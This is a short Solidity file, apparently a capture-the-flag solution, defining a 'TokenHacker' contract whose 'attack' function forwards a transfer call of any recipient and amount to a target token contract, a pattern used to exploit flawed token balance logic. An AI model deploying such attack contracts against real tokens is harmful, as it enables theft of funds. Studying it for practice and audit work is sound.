// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "forge-std/console.sol";

contract TokenHacker {

  address contractToHack;

  constructor(address _contract) {
    contractToHack = _contract;
  }

  function attack(address _targetWallet, uint _amount) public  returns (bool) {
    (bool success, ) = contractToHack.call(abi.encodeWithSignature("transfer(address,uint256)", _targetWallet, _amount));
    return success;
  }
}